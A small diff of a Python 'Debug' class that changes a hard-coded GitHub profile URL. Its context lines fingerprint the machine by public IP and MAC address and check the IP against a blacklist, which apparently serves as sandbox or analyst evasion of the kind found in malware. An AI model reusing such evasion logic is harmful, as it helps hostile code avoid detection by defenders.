@@ -873,7 +873,7 @@ class Debug:
 
         ip = requests.get('https://api.ipify.org').text
         mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-        github = "https://github.com/Smug246"
+        github = "https://github.com/errias"
 
         if ip in self.blackListedIPS:
             return True
